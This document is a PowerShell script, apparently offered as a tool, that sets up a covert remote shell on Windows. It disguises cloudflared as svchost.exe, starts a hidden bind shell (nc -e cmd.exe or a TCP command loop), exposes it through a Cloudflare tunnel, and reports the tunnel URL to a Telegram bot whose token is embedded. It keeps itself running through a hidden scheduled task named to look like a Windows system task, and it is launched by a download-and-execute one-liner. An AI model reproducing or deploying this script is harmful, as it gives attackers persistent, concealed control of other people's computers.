# Cloudflare Tunnel Reverse Shell for Windows (Hidden)
# Run directly from PowerShell: IEX (New-Object Net.WebClient).DownloadString('URL')

$ErrorActionPreference = "Stop"

# ========== KONFIGURASI ==========
$userHome = $env:USERPROFILE
$configDir = "$userHome\.config\dbus"
$tmpDir = "$env:TEMP\.cf-$([System.Environment]::UserName)"
$binHiddenName = "svchost.exe"
$port = Get-Random -Minimum 10000 -Maximum 50000

# Telegram
$telegramBotToken = "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
$telegramChatId = "6223261018"

# Download cloudflared
$arch = if ([Environment]::Is64BitOperatingSystem) { "windows-amd64" } else { "windows-386" }
$urlCloudflared = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-$arch.exe"
$cfPath = "$configDir\$binHiddenName"

# ========== FUNCTIONS ==========
function Send-Telegram($message) {
    if ($telegramBotToken -and $telegramBotToken -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
        $body = @{ chat_id = $telegramChatId; text = $message; parse_mode = "HTML" }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue
    }
}

function Start-HiddenProcess($command, $arguments) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $command
    $psi.Arguments = $arguments
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    $p.Id
}

# ========== UNINSTALL ==========
if ($env:CF_UNINSTALL) {
    $tokenFile = "$configDir\.uninstall_token"
    if (Test-Path $tokenFile) {
        $storedToken = Get-Content $tokenFile -Raw
        if ($env:CF_UNINSTALL -eq $storedToken) {
            Write-Host "Removing installed files..."
            schtasks /End /TN "Microsoft\Windows\Winlogon\Shell" 2>$null
            schtasks /Delete /TN "Microsoft\Windows\Winlogon\Shell" /F 2>$null
            Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.StartInfo.FileName -like "*cloudflared*" } | Stop-Process -Force
            Remove-Item -Recurse -Force $configDir -ErrorAction SilentlyContinue
            Remove-Item -Recurse -Force $tmpDir -ErrorAction SilentlyContinue
            Write-Host "Uninstall complete."
            exit 0
        } else {
            Write-Host "Invalid token."
            exit 1
        }
    } else {
        Write-Host "No installation found."
        exit 1
    }
}

# ========== INSTALL ==========
if (Test-Path "$configDir\.uninstall_token") {
    Write-Host "Installation already detected. Uninstall first with token."
    exit 1
}

New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
New-Item -ItemType Directory -Force -Path $configDir | Out-Null

Write-Host "Downloading cloudflared..."
Invoke-WebRequest -Uri $urlCloudflared -OutFile $cfPath -ErrorAction Stop

# Start bindshell (using PowerShell TCP listener if netcat not available)
Write-Host "Starting bindshell on port $port ..."
$bindCmd = if (Get-Command nc -ErrorAction SilentlyContinue) {
    "nc -l -p $port -s 127.0.0.1 -e cmd.exe"
} else {
    "powershell -NoProfile -Command `$listener = [System.Net.Sockets.TcpListener]::new('127.0.0.1', $port); `$listener.Start(); while(`$true) { `$client = `$listener.AcceptTcpClient(); `$stream = `$client.GetStream(); `$writer = New-Object System.IO.StreamWriter `$stream; `$reader = New-Object System.IO.StreamReader `$stream; `$writer.AutoFlush = `$true; `$writer.WriteLine('> '); while(`$client.Connected) { if (`$stream.DataAvailable) { `$cmd = `$reader.ReadLine(); if (`$cmd -eq 'exit') { break }; `$output = & `$cmd 2>&1 | Out-String; `$writer.WriteLine(`$output); `$writer.Write('> ') } } `$client.Close() }"
}
$bindPid = Start-HiddenProcess "cmd.exe" "/c $bindCmd"

# Start tunnel
Write-Host "Starting Cloudflare tunnel..."
$tunnelLog = "$tmpDir\cloudflared.log"
$tunnelProc = Start-Process -FilePath $cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput $tunnelLog -RedirectStandardError $tunnelLog
$tunnelPid = $tunnelProc.Id

# Save token and config
$token = -join ((48..57) + (97..102) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
$token | Out-File -FilePath "$configDir\.uninstall_token"
@"
BIND_PID=$bindPid
TUNNEL_PID=$tunnelPid
PORT=$port
"@ | Out-File -FilePath "$configDir\tunnel.conf"

# Wait for URL and notify
Write-Host "Waiting for tunnel URL..."
Start-Sleep -Seconds 5
$url = Select-String -Path $tunnelLog -Pattern "https://([a-z0-9-]+)\.trycloudflare\.com" | Select-Object -First 1 | ForEach-Object { $_.Matches[0].Value }
if ($url) {
    Write-Host "Tunnel URL: $url"
    Send-Telegram "✅ Initial Tunnel URL: $url"
} else {
    Write-Host "No URL found yet, check log: $tunnelLog"
}

# Persistence via Scheduled Task
$taskName = "Microsoft\Windows\Winlogon\Shell"
$persistScript = "$configDir\cf_tunnel.ps1"
@"
# Persistence script
`$cfPath = "$cfPath"
`$port = $port
`$log = "$tmpDir\cloudflared.log"
while (`$true) {
    `$p = Start-Process -FilePath `$cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:`$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$log -RedirectStandardError `$log
    `$p.WaitForExit()
    Start-Sleep -Seconds 10
}
"@ | Out-File -FilePath $persistScript -Encoding UTF8

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistScript`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$principal = New-ScheduledTaskPrincipal -UserID $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

Write-Host "--> Persistence installed (Scheduled Task: $taskName)"
Write-Host "--> To uninstall: `$env:CF_UNINSTALL = '$token'; powershell -NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('URL')`""
Write-Host "--> Join us on Telegram - https://t.me/thcorg"
